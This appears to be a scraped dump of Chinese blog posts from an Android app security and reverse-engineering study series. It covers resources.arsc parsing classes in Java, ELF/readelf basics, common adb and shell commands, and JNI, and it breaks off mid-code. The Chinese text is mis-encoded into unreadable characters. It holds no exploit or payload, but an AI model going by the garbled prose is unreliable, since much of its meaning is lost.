16 17 18 19 20 21 22 23 24 public class ResTableEntry { public final static int FLAG_COMPLEX = 0x0001; public final static int FLAG_PUBLIC = 0x0002; public short size; public short flags; public ResStringPoolRef key; public ResTableEntry(){ key = new ResStringPoolRef(); } public int getSize(){ return 2+2+key.getSize(); } @Override public String toString(){ return \u0026#34;size:\u0026#34;+size+\u0026#34;,flags:\u0026#34;+flags+\u0026#34;,key:\u0026#34;+key.toString()+\u0026#34;,str:\u0026#34;+ParseResourceUtils.getKeyString(key.index); } } ResTable_entryæ ¹æ®flagsçš„ä¸åŒ,åé¢è·Ÿéšçš„æ•°æ®ä¹Ÿä¸ç›¸åŒ,å¦‚æœflagsæ­¤ä½ä¸º1,åˆ™ResTable_entryæ˜¯ResTable_map_entry,ResTable_map_entryç»§æ‰¿è‡ªResTable_entry,å…¶ç»“æ„å¦‚ä¸‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTableMapEntry extends ResTableEntry{ public ResTableRef parent; public int count; public ResTableMapEntry(){ parent = new ResTableRef(); } @Override public int getSize(){ return super.getSize() + parent.getSize() + 4; } @Override public String toString(){ return super.toString() + \u0026#34;,parent:\u0026#34;+parent.toString()+\u0026#34;,count:\u0026#34;+count; } } ResTable_map_entryå…¶åè·Ÿéšåˆ™countä¸ªResTable_mapç±»å‹çš„æ•°ç»„,ResTable_mapçš„ç»“æ„å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package com.wjdiankong.parseresource.type; /** struct ResTable_map { //bagèµ„æºé¡¹ID ResTable_ref name; //bagèµ„æºé¡¹å€¼ Res_value value; }; * @author i * */ public class ResTableMap { public ResTableRef name; public ResValue value; public ResTableMap(){ name = new ResTableRef(); value = new ResValue(); } public int getSize(){ return name.getSize() + value.getSize(); } @Override public String toString(){ return name.toString()+\u0026#34;,value:\u0026#34;+value.toString(); } } å¦‚æœflagsæ­¤ä½ä¸º0,åˆ™ResTable_entryå…¶åè·Ÿéšçš„æ˜¯ä¸€ä¸ªRes_value,æè¿°ä¸€ä¸ªæ™®é€šèµ„æºçš„å€¼,Res_valueç»“æ„å¦‚ä¸‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 public class ResValue { //dataTypeå­—æ®µä½¿ç”¨çš„å¸¸é‡ public final static int TYPE_NULL = 0x00; public final static int TYPE_REFERENCE = 0x01; public final static int TYPE_ATTRIBUTE = 0x02; public final static int TYPE_STRING = 0x03; public final static int TYPE_FLOAT = 0x04; public final static int TYPE_DIMENSION = 0x05; public final static int TYPE_FRACTION = 0x06; public final static int TYPE_FIRST_INT = 0x10; public final static int TYPE_INT_DEC = 0x10; public final static int TYPE_INT_HEX = 0x11; public final static int TYPE_INT_BOOLEAN = 0x12; public final static int TYPE_FIRST_COLOR_INT = 0x1c; public final static int TYPE_INT_COLOR_ARGB8 = 0x1c; public final static int TYPE_INT_COLOR_RGB8 = 0x1d; public final static int TYPE_INT_COLOR_ARGB4 = 0x1e; public final static int TYPE_INT_COLOR_RGB4 = 0x1f; public final static int TYPE_LAST_COLOR_INT = 0x1f; public final static int TYPE_LAST_INT = 0x1f; public static final int COMPLEX_UNIT_PX\t=0, COMPLEX_UNIT_DIP\t=1, COMPLEX_UNIT_SP\t=2, COMPLEX_UNIT_PT\t=3, COMPLEX_UNIT_IN\t=4, COMPLEX_UNIT_MM\t=5, COMPLEX_UNIT_SHIFT\t=0, COMPLEX_UNIT_MASK\t=15, COMPLEX_UNIT_FRACTION\t=0, COMPLEX_UNIT_FRACTION_PARENT=1, COMPLEX_RADIX_23p0\t=0, COMPLEX_RADIX_16p7\t=1, COMPLEX_RADIX_8p15\t=2, COMPLEX_RADIX_0p23\t=3, COMPLEX_RADIX_SHIFT\t=4, COMPLEX_RADIX_MASK\t=3, COMPLEX_MANTISSA_SHIFT\t=8, COMPLEX_MANTISSA_MASK\t=0xFFFFFF; public short size; //ResValueçš„å¤´éƒ¨å¤§å° public byte res0; //ä¿ç•™ï¼Œå§‹ç»ˆä¸º0 public byte dataType; //æ•°æ®çš„ç±»å‹,å¯ä»¥ä»ä¸Šé¢çš„æšä¸¾ç±»å‹ä¸­è·å– public int data; //æ•°æ®å¯¹åº”çš„ç´¢å¼• public int getSize(){ return 2 + 1 + 1 + 4; } public String getTypeStr(){ switch(dataType){ case TYPE_NULL: return \u0026#34;TYPE_NULL\u0026#34;; case TYPE_REFERENCE: return \u0026#34;TYPE_REFERENCE\u0026#34;; case TYPE_ATTRIBUTE: return \u0026#34;TYPE_ATTRIBUTE\u0026#34;; case TYPE_STRING: return \u0026#34;TYPE_STRING\u0026#34;; case TYPE_FLOAT: return \u0026#34;TYPE_FLOAT\u0026#34;; case TYPE_DIMENSION: return \u0026#34;TYPE_DIMENSION\u0026#34;; case TYPE_FRACTION: return \u0026#34;TYPE_FRACTION\u0026#34;; case TYPE_FIRST_INT: return \u0026#34;TYPE_FIRST_INT\u0026#34;; case TYPE_INT_HEX: return \u0026#34;TYPE_INT_HEX\u0026#34;; case TYPE_INT_BOOLEAN: return \u0026#34;TYPE_INT_BOOLEAN\u0026#34;; case TYPE_FIRST_COLOR_INT: return \u0026#34;TYPE_FIRST_COLOR_INT\u0026#34;; case TYPE_INT_COLOR_RGB8: return \u0026#34;TYPE_INT_COLOR_RGB8\u0026#34;; case TYPE_INT_COLOR_ARGB4: return \u0026#34;TYPE_INT_COLOR_ARGB4\u0026#34;; case TYPE_INT_COLOR_RGB4: return \u0026#34;TYPE_INT_COLOR_RGB4\u0026#34;; } return \u0026#34;\u0026#34;; } /*public String getDataStr(){ if(dataType == TYPE_STRING){ return ParseResourceUtils.getResString(data); }else if(dataType == TYPE_FIRST_COLOR_INT){ return Utils.bytesToHexString(Utils.int2Byte(data)); }else if(dataType == TYPE_INT_BOOLEAN){ return data==0 ? \u0026#34;false\u0026#34; : \u0026#34;true\u0026#34;; } return data+\u0026#34;\u0026#34;; }*/ public String getDataStr() { if (dataType == TYPE_STRING) { return ParseResourceUtils.getResString(data); } if (dataType == TYPE_ATTRIBUTE) { return String.format(\u0026#34;?%s%08X\u0026#34;,getPackage(data),data); } if (dataType == TYPE_REFERENCE) { return String.format(\u0026#34;@%s%08X\u0026#34;,getPackage(data),data); } if (dataType == TYPE_FLOAT) { return String.valueOf(Float.intBitsToFloat(data)); } if (dataType == TYPE_INT_HEX) { return String.format(\u0026#34;0x%08X\u0026#34;,data); } if (dataType == TYPE_INT_BOOLEAN) { return data!=0?\u0026#34;true\u0026#34;:\u0026#34;false\u0026#34;; } if (dataType == TYPE_DIMENSION) { return Float.toString(complexToFloat(data))+ DIMENSION_UNITS[data \u0026amp; COMPLEX_UNIT_MASK]; } if (dataType == TYPE_FRACTION) { return Float.toString(complexToFloat(data))+ FRACTION_UNITS[data \u0026amp; COMPLEX_UNIT_MASK]; } if (dataType \u0026gt;= TYPE_FIRST_COLOR_INT \u0026amp;\u0026amp; dataType \u0026lt;= TYPE_LAST_COLOR_INT) { return String.format(\u0026#34;#%08X\u0026#34;,data); } if (dataType \u0026gt;= TYPE_FIRST_INT \u0026amp;\u0026amp; dataType \u0026lt;= TYPE_LAST_INT) { return String.valueOf(data); } return String.format(\u0026#34;\u0026lt;0x%X, type 0x%02X\u0026gt;\u0026#34;,data, dataType); } private static String getPackage(int id) { if (id\u0026gt;\u0026gt;\u0026gt;24==1) { return \u0026#34;android:\u0026#34;; } return \u0026#34;\u0026#34;; } public static float complexToFloat(int complex) { return (float)(complex \u0026amp; 0xFFFFFF00)*RADIX_MULTS[(complex\u0026gt;\u0026gt;4) \u0026amp; 3]; } private static final float RADIX_MULTS[]={ 0.00390625F,3.051758E-005F,1.192093E-007F,4.656613E-010F }; private static final String DIMENSION_UNITS[]={ \u0026#34;px\u0026#34;,\u0026#34;dip\u0026#34;,\u0026#34;sp\u0026#34;,\u0026#34;pt\u0026#34;,\u0026#34;in\u0026#34;,\u0026#34;mm\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; }; private static final String FRACTION_UNITS[]={ \u0026#34;%\u0026#34;,\u0026#34;%p\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; }; @Override public String toString(){ return \u0026#34;size:\u0026#34;+size+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,dataType:\u0026#34;+getTypeStr()+\u0026#34;,data:\u0026#34;+getDataStr(); } } ä»¥ä¸Šä»£ç æ¥è‡ªäºä¹¦çš„åŸä½œè€…çš„åšå®¢ï¼šhttps://blog.csdn.net/jiangwei0910410003/article/details/50628894\nåšå®¢é‡Œè¿˜æœ‰å¦‚ä½•è§£ææ“ä½œï¼Œç•™çœ‹ã€‚\næ€»ç»“ è¿™ä¸¤ç« è®²çš„è¿˜æ˜¯æŒºè¯¦ç»†çš„ï¼Œå¯ä»¥ç•™ç€å¤‡ç”¨æŸ¥é˜…ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶éƒ½èƒ½åŠ ä»¥æ··æ·†æ¥ä¿æŠ¤åº”ç”¨ï¼Œæ‰€ä»¥è¿˜æ˜¯æŒºé‡è¦çš„ã€‚\n","date":"2018-08-29T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%875-6/","title":"Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡5-6"},{"content":"Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡4 ä¸€ã€ åŸºç¡€ç¯‡â‘£ ç¬¬å››ç«  soæ–‡ä»¶æ ¼å¼è§£æ ELFæ–‡ä»¶æ ¼å¼\nsoæ–‡ä»¶-\u0026gt;elfæ–‡ä»¶ï¼Œæ–‡ä»¶æ ¼å¼çœ‹å›¾ï¼ˆå¼•ç”¨è‡ª@éè™«ï¼‰ï¼š\nè§£æå·¥å…·\nreadelf å¸¸ç”¨å‘½ä»¤\nreadelf -h xxx.so æŸ¥å¤´éƒ¨ä¿¡æ¯\nreadelf -S xxx.so æŸ¥èŠ‚ï¼ˆSectionï¼‰ä¿¡æ¯\nreadelf -l xxx.so æŸ¥æ®µï¼ˆProgramï¼‰ä¿¡æ¯\nreadelf -a xxx.so æŸ¥å…¨éƒ¨ä¿¡æ¯\nè§£æELFæ–‡ä»¶\nåŠ¨æ‰‹è§£æä¸€ä¸ªelfæ–‡ä»¶ ã€‚ã€‚ã€‚\nå¤ªæ°´ è¿™é‡Œçš„å†…å®¹\nç›´æ¥å»çœ‹æºç å®ç°ç”¨javaè§£æelfæ–‡ä»¶ä¿¡æ¯https://github.com/fourbrother/parse_androidso\nELF ç›¸å…³å†…å®¹è¿˜æ˜¯å•ç‹¬è¯¦ç»†åˆ†æ å•ç‹¬å†™ä¸€ç¯‡å§\nELFä¹¦ç±ã€ŠLinuxäºŒè¿›åˆ¶åˆ†æã€‹\næ€»ç»“ åŠ å›ºè„±å£³å¿…é¡»æŒæ¡çš„çŸ¥è¯†ç‚¹ã€‚\n","date":"2018-08-22T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%874/","title":"Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡4"},{"content":"Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡3 ä¸€ã€ åŸºç¡€ç¯‡â‘¢ ç¬¬ä¸‰ç«  Androidä¸­å¼€å‘ä¸é€†å‘å¸¸ç”¨å‘½ä»¤æ€»ç»“ 1. åŸºç¡€å‘½ä»¤ 1.1 catå‘½ä»¤ â€‹ æŸ¥çœ‹æ–‡ä»¶å†…å®¹ ç»“åˆgrepè¿›è¡Œè¿‡æ»¤\n1.2 echo/touchå‘½ä»¤ â€‹ å†™æ–‡ä»¶ é…ä¸ªå®šå‘ç¬¦ä½¿ç”¨\n2. éshellå‘½ä»¤ 2.1 adb shell dumpsys sctivity top â€‹ è¯´æ˜ï¼šæŸ¥çœ‹å½“å‰åº”ç”¨çš„activityä¿¡æ¯\nâ€‹ ç”¨æ³•ï¼šè¿è¡Œéœ€è¦æŸ¥çœ‹çš„åº”ç”¨\nâ€‹ å¦‚æœç›´æ¥è¿è¡Œ adb shell dmpsysä¼šæŠŠå½“å‰ç³»ç»Ÿä¸­çš„æ‰€æœ‰åº”ç”¨è¿è¡Œçš„å››å¤§ç»„ä»¶éƒ½æ‰“å°å‡ºæ¥ å†…å®¹éå¸¸å¤š ä½¿ç”¨ä¿¡æ¯é‡å®šå‘æ¥è¿›è¡Œé€‰æ‹©ï¼šå¯å€ŸåŠ©Windowsçš„startå‘½ä»¤\n2.2 adb shell dumpsys package â€‹ è¯´æ˜ï¼šæŸ¥çœ‹æŒ‡å®šåŒ…ååº”ç”¨çš„è¯¦ç»†ä¿¡æ¯ ï¼ˆç›¸å½“äºAndroidManifest.xmlçš„å†…å®¹ï¼‰\nâ€‹ ç”¨æ³•ï¼šadb shell dumpsys package [pkgname]\n2.3 adb shell dumpsys meminfo â€‹ è¯´æ˜ï¼šæŸ¥çœ‹æŒ‡å®šè¿›ç¨‹åæˆ–è€…è¿›ç¨‹idçš„å†…å­˜ä¿¡æ¯\nâ€‹ ç”¨æ³•ï¼šadb shell dumpsys meminfo [pname/pid]\nâ€‹ å’Œåé¢çš„topå‘½ä»¤ç»“åˆä½¿ç”¨ å¯ä»¥åˆ†æåº”ç”¨çš„æ€§èƒ½æ¶ˆè€—æƒ…å†µ\n2.4 adb shell dump dbnfo â€‹ è¯´æ˜ï¼šæŸ¥çœ‹æŒ‡å®šåŒ…ååº”ç”¨çš„æ•°æ®åº“å­˜å‚¨ä¿¡æ¯ï¼ˆåŒ…æ‹¬å­˜å‚¨çš„SQLè¯­å¥ï¼‰\nâ€‹ ç”¨æ³•ï¼šadb shell dump dbnfo [packagename]\n2.5 adb install â€‹ è¯´æ˜ï¼šå®‰è£…åº”ç”¨åŒ…apkæ–‡ä»¶\nâ€‹ ç”¨æ³•ï¼šadb install [apkæ–‡ä»¶]\nâ€‹ å‡çº§å®‰è£… ä½¿ç”¨apk install -r [apkæ–‡ä»¶]\n2.6 adb uninstall â€‹ å¸è½½\n2.7 adb pull â€‹ ä»è®¾å¤‡å¤åˆ¶åˆ°æœ¬åœ°\nâ€‹ adb pull è®¾å¤‡ç›®å½• æœ¬åœ°ç›®å½•\n2.8 adb push â€‹ ä»æœ¬åœ°å¤åˆ¶åˆ°è®¾å¤‡\nâ€‹ åŒä¸Š\n2.9 adb shell screencap â€‹ æˆªå±\nâ€‹ adb shell scteencap -p æˆªå›¾æ–‡ä»¶ç›®å½•\nâ€‹ å¿«é€Ÿæˆªå–æ‰‹æœºå±å¹•\n1 2 3 adb shell screencap -p /sdcard/tmp.png adb pull /sdcard/tmp.png D:\\ start D:\\tmp.png 2.10 adb shell screenrecord â€‹ å½•å±\nâ€‹ adb shell screenrecord è·¯å¾„\n2.11 adb shell input text â€‹ è¾“å…¥æ–‡æœ¬å†…å®¹\nâ€‹ adb shell input text [éœ€è¦è¾“å…¥æ–‡æœ¬æ¡†çš„å†…å®¹]\nâ€‹ eg: è®©è¾“å…¥å†…å®¹çš„æ–‡æœ¬æ¡†å›å»ç„¦ç‚¹\nâ€‹ adb shell input text 'hello world'\nâ€‹ è¿™ä¸ªå‘½ä»¤å¯ä»¥æ¨¡æ‹Ÿç‰©ç†é”®ç›˜ã€è™šæ‹Ÿé”®ç›˜ã€æ»‘åŠ¨ã€æ»šåŠ¨ç­‰äº‹ä»¶ã€‚\n2.12 adb forward â€‹ ç«¯å£è½¬å‘å‘½ä»¤\nâ€‹ adb forward [è¿œç¨‹åè®®ï¼šç«¯å£å·]Â· [è®¾å¤‡åè®®ï¼šç«¯å£å· ]\nâ€‹ eg: adb forward tcp:23946 tcp:23946 IDA è°ƒè¯•\nâ€‹ adb forwrd tcp:8700 jwdp:1786\n2.13 adb jdwp â€‹ æŸ¥çœ‹è®¾å¤‡ä¸­å¯ä»¥è¢«è°ƒè¯•çš„åº”ç”¨çš„è¿›ç¨‹å·\nâ€‹ adb jdwp\n2.14 adb logcat â€‹ æŸ¥çœ‹å½“å‰çš„æ—¥å¿—ä¿¡æ¯\nâ€‹ adb logcat -s tag egï¼šadb logcat -s fb\nâ€‹ adb logcat | findstr pname/pip/keyword\nâ€‹ adb logcat | findstr åŒ…\nâ€‹ æ—¥å¿—ä¿¡æ¯è¿‡æ»¤\n3. shell å‘½ä»¤ è¿™å„¿shellå‘½ä»¤æ˜¯æŒ‡å…ˆè¿è¡Œadb shell å†æ‰§è¡Œå‘½ä»¤ ä¸éshellå‘½ä»¤äº’é€š\n3.1 run-as â€‹ åœ¨érootè®¾å¤‡ä¸­æŸ¥çœ‹æŒ‡å®šdebugæ¨¡å¼çš„åŒ…ååº”ç”¨æ²™ç›’æ•°æ®\nâ€‹ run-as [package name]\n3.2 ps â€‹ æŸ¥çœ‹è®¾å¤‡è¿›ç¨‹ä¿¡æ¯æˆ–è€…æŒ‡å®šè¿›ç¨‹çš„çº¿ç¨‹ä¿¡æ¯\nâ€‹ ps | grep è¿‡æ»¤å†…å®¹\nâ€‹ ps -t [pid] æŸ¥çœ‹pid å¯¹åº”çš„çº¿ç¨‹ä¿¡æ¯\nâ€‹\n3.3 pm clear â€‹ æ¸…ç©ºæŒ‡å®šåŒ…åçš„åº”ç”¨æ•°æ®\nâ€‹ pm clear [packagename]\n3.4 pm install â€‹ å®‰è£…è®¾å¤‡ä¸­çš„apk åŒadb install\n3.5 pm uninstall â€‹ å¸è½½\n3.6 am start â€‹ å¯åŠ¨ä¸€ä¸ªåº”ç”¨\nâ€‹ am start -n [packname]/[packname].[activity name]\nâ€‹ am start -D -n (ä»¥debugæ–¹å¼å¯åŠ¨)\n3.7 am startservice â€‹ å¯åŠ¨ä¸€ä¸ªæœåŠ¡\nâ€‹ am startservice -n [packagename]/[package name].[service name]\n3.8 am broadcast â€‹ å‘é€ä¸€ä¸ªå¹¿æ’­\nâ€‹ am broadcast -a [å¹¿æ’­åŠ¨ä½œ]\n3.9 netcfg â€‹ æŸ¥çœ‹è®¾å¤‡çš„ipåœ°å€\n3.10 netstat â€‹ æŸ¥çœ‹è®¾å¤‡çš„ç«¯å£å·ä¿¡æ¯\n3.11 app_process â€‹ è¿è¡Œjavaä»£ç \nâ€‹ app_process [è¿è¡Œä»£ç ç›®å½•]Â· [è¿è¡Œä¸»ç±»]\nâ€‹ eg:\nâ€‹ export CLASSPATH = /data/demo.jar\nâ€‹ exec /system/bin/app_process /data/cn.wdasdkl.Main\n3.12 dalvikvm â€‹ è¿è¡Œdexæ–‡ä»¶\nâ€‹ dalvikvm -cp [dexæ–‡ä»¶] Â· [è¿è¡Œä¸»ç±»]\nâ€‹ å·®ä¸å¤šåŒä¸Šçš„ç”¨å¤„\n3.13 top â€‹ æŸ¥çœ‹å½“å‰åº”ç”¨CPUçš„æ¶ˆè€—ä¿¡æ¯ã€‚\nâ€‹ top [-n/-m/-d/-s/-t]\nâ€‹ -m æœ€å¤šæ˜¾ç¤ºå¤šå°‘ä¸ªè¿›ç¨‹\nâ€‹ -n åˆ·æ–°æ¬¡æ•°\nâ€‹ -d åˆ·æ–°æ—¶é—´é—´éš”\nâ€‹ -s æŒ‰é‚£ä¸€åˆ—æ’åº\nâ€‹ -t æ˜¾ç¤ºçº¿ç¨‹ä¿¡æ¯è€Œä¸æ˜¯è¿›ç¨‹\n3.14 getprop â€‹ æŸ¥çœ‹ç³»ç»Ÿå±æ€§\nâ€‹ getprop [å±æ€§å€¼åç§°]\nâ€‹ egï¼šgetprop ro.debuggable\nâ€‹ æŸ¥çœ‹è®¾å¤‡çš„ä¿¡æ¯\n4 æ“ä½œapk å‘½ä»¤ 4.1 ç”¨aapt å‘½ä»¤æ“ä½œapkå‘½ä»¤ â€‹ æŸ¥çœ‹apkä¸­çš„ä¿¡æ¯ä»¥åŠç¼–è¾‘apkç¨‹åºåŒ…\nâ€‹ aapt dump xmltree [apkåŒ…] Â· [éœ€è¦æŸ¥çœ‹çš„èµ„æºæ–‡ä»¶]\nâ€‹ egï¼šaapt dump xmltree demp.apk AndroidManifest.xml\n4.2 ç”¨dexdump æ“ä½œdex å‘½ä»¤ â€‹ æŸ¥çœ‹dexçš„è¯¦ç»†ä¿¡æ¯\nâ€‹ dexdump [dexæ–‡ä»¶è·¯å¾„]\n5 è¿›ç¨‹å‘½ä»¤ 1 ##### 5.1 æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å†…å­˜åŠ è½½æƒ…å†µ â€‹ cat proc/[pid]/maps æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„ä¿¡æ¯ï¼Œæ¯”å¦‚åŠ è½½äº†é‚£äº›soæ–‡ä»¶ï¼Œdexæ–‡ä»¶ç­‰ç­‰ã€‚\n5.2 æŸ¥çœ‹è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ â€‹ cat /proc/[pid]/status\n5.3 æŸ¥çœ‹å½“å‰åº”ç”¨ä½¿ç”¨çš„ç«¯å£å·ä¿¡æ¯ â€‹ cat /proc /[pid] / net / tcp/ tcp6 /udp /udp6\næ€»ç»“ â€‹ è¿™ç« å°±æ˜¯ä¸€äº›ä¼šç”¨åˆ°çš„å‘½ä»¤ï¼Œåé¢çš„å­¦ä¹ å¿…ä¸å¯å°‘çš„çŸ¥è¯†ç‚¹ã€‚\n","date":"2018-08-16T02:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%873/","title":"Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡3"},{"content":"Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡2 ä¸€ã€ åŸºç¡€ç¯‡â‘¡ ç¬¬äºŒç«  Androidä¸­NDKçš„å¼€å‘ 1. ç›¸å…³ç¯å¢ƒ ç›¸å…³ç¯å¢ƒå‚è€ƒå¦å¤–ä¸€ç¯‡æ–‡ç« Androidå®‰å…¨å’Œå¼€å‘ç¯å¢ƒæ­å»º\n2. JNIåŸºç¡€ 2.1 ç¬¬ä¸€è¡Œä»£ç (ä¹¦ä¸Šä½¿ç”¨Eclipse,æˆ‘ä½¿ç”¨AS(ç®€å•æ–¹ä¾¿å¾ˆå¤š)) â€‹ å‚è€ƒæ–‡ç« Androidå®‰å…¨å’Œå¼€å‘ç¯å¢ƒæ­å»ºä¸­çš„JNIå¼€å‘ç« èŠ‚\n2.2 JNIEnvç±»å‹å’Œjobjectç±»å‹ AS é»˜è®¤è‡ªåŠ¨ç”Ÿæˆ 1 public native String stringFromJNI(); 1 2 3 4 5 Java_com_naivete_jni_1study_MainActivity_stringFromJNI( JNIEnv *env, jobject /* this */) { std::string hello = \u0026#34;Hello from C++\u0026#34;; return env-\u0026gt;NewStringUTF(hello.c_str()); JNIEnvç±»å‹\né€šè¿‡JNIEnv* æŒ‡é’ˆå°±å¯ä»¥å¯¹Javaç«¯çš„ä»£ç è¿›è¡Œæ“ä½œ\nJniçš„æ‰€æœ‰å‡½æ•°å¯ä»¥æŸ¥çœ‹jni.hæ–‡ä»¶\nä¸‹é¢æ˜¯ä¸€äº›å‡½æ•°egï¼š\nNewObject : åˆ›å»ºJavaç±»ä¸­çš„å¯¹è±¡ã€‚\nNewString : åˆ›å»ºJavaç±»ä¸­çš„Stringå¯¹è±¡ã€‚\nNewArray : åˆ›å»ºç±»å‹ä¸ºTypeçš„æ•°ç»„å¯¹è±¡\nGetField: è·å–å‹ä¸ºTypeçš„å­—æ®µã€‚\nSetFileld: è®¾ç½®ç±»å‹ä¸ºTypeçš„å­—æ®µçš„å€¼ã€‚\nGetStaticField: è·å–ç±»å‹ä¸ºTypeçš„staticçš„å­—æ®µã€‚\nSetStaticField:è®¾ç½®ç±»å‹ä¸ºTypedeçš„staticçš„å­—æ®µçš„å€¼ã€‚\nCallMethod: è°ƒç”¨è¿”å›ç±»å‹ä¸ºTypeçš„æ–¹æ³•ã€‚\nCallStaticMethod: è°ƒç”¨è¿”å›å€¼ç±»å‹ä¸ºTypeçš„Staticæ–¹æ³•\nâ€¦..\nJobjectå‚æ•°obj\nå¦‚æœnative æ–¹æ³•ä¸æ˜¯static ,objå°±ä»£è¡¨nativeæ–¹æ³•çš„å®ä¾‹ã€‚\nå¦‚æœnariveæ–¹æ³•æ˜¯static,obj å°±ä»£è¡¨nativeæ–¹æ³•çš„ç±»çš„classå¯¹è±¡å®ä¾‹ã€‚\nJavaå’ŒC++ä¸­çš„åŸºæœ¬ç±»å‹çš„æ˜ å°„å…³ç³»ï¼š\nå…·ä½“æŸ¥çœ‹jni.hæ–‡ä»¶çš„è¯¦ç»†è¯´æ˜\nJavaç±»å‹ æœ¬åœ°ç±»å‹ JNIå®šä¹‰çš„åˆ«å int long jint/jsize long _int64 jlong byte signed char jbyte boolean unsigned char jboolean char unsigned short jchar short short jshort float float jfloat double double jdouble Object _jobject* jobject jclassç±»å‹\njclass è¡¨ç¤ºjavaä¸­çš„class ç±»ï¼š\nJNIEnv ç±»ä¸­æœ‰å¦‚ä¸‹å‡ ä¸ªç®€å•çš„å‡½æ•°å¯ä»¥å–å¾—jclass:\njclass FindClass( const char* clsName):é€šè¿‡ç±»çš„åç§°æ¥è·å–jclass\njcalss GetObjectClass( jobject obj ):é€šè¿‡å¯¹è±¡å®ä¾‹æ¥è·å–jcalss,ç›¸å½“äºjava ä¸­çš„getclassæ–¹æ³•\njclass GetSuperClass(jclass obj):é€šè¿‡jclass å¯ä»¥è·å–å…¶çˆ¶ç±»çš„jclasså¯¹è±¡ã€‚\nnativeä¸­è®¿é—®Javaå±‚ä»£ç \nå¸¸è§çš„åº”ç”¨å°±æ˜¯è·å–ç±»çš„å±æ€§å’Œè°ƒç”¨ç±»çš„æ–¹æ³•\nJNiåœ¨jni.hå¤´æ–‡ä»¶ä¸­å®šä¹‰äº†jfieldIdã€jmethodIDç±»å‹åˆ†åˆ«ä»£è¡¨JAVAç«¯çš„å±æ€§å’Œæ–¹æ³•ã€‚\nä½¿ç”¨JNIçš„ä»¥ä¸‹æ–¹æ³•æ¥å–å¾—ç›¸åº”çš„jfieldIdã€jmethodIDï¼š\nGetFieldIDã€GetMethodID\nGetStaticFieldIDã€GetStaticMethodID\næŸ¥çœ‹jni.hä¸­æºå‡½æ•°\n1 GetFieldID(jclass clazz, const char* name, const char* sig) â€‹ å‚æ•°è¯´æ˜ï¼š\nclazz æ–¹æ³•ä¾èµ–çš„ç±»å¯¹è±¡çš„classå¯¹è±¡\nname: å­—æ®µçš„åç§°\nsig : å­—æ®µçš„ç­¾å\næŸ¥çœ‹ç­¾åå‘½ä»¤\njavap -s -p å­—èŠ‚ç .class æ–‡ä»¶\nGetMethodID ä¹Ÿèƒ½å¤Ÿä¼šçš„æ„é€ å‡½æ•°çš„jmethodIDï¼Œåˆ›å»ºä¸€ä¸ªJavaå¯¹è±¡æ˜¯å¯ä»¥è°ƒç”¨æŒ‡å®šçš„æ„é€ æ–¹æ³•ï¼Œegï¼š\nenv-\u0026gt;GetmethodID(data_class,\u0026quot;\u0026lt;init\u0026gt;\u0026quot;,\u0026quot;()v\u0026quot;);\nç­¾åçš„æ ¼å¼ï¼š\nç±»å‹ ç›¸åº”çš„ç­¾å boolean Z byte B chat C short S int I long L float F double D void V object Lç”¨/åˆ†å‰²åŒ…çš„å®Œæ•´ç±»åï¼›Ljava/lang/String; Array [ç­¾å [I [Ljava/lang/Object Method (å‚æ•°ç±»å‹ç­¾åÂ·Â·Â· .) è¿”å›å€¼ç±»å‹ç­¾å eg:\n1 2 3 4 5 6 7 8 9 10 11 12 13 package com.naivete.jni_study; import java.util.Date; public class Hello { public int property; public int function(int foo, Date date,int[] arr){ System.out.println(\u0026#34;function\u0026#34;); return 0; } public native void test(); } 1 2 3 4 5 6 7 8 9 10 extern \u0026#34;C\u0026#34; JNIEXPORT void JNICALL Java_com_naivete_jni_1study_Hello_test(JNIEnv *env, jobject instance) { // TODO jclass helloclazz = env-\u0026gt;GetObjectClass(instance); jfieldID field_prop = 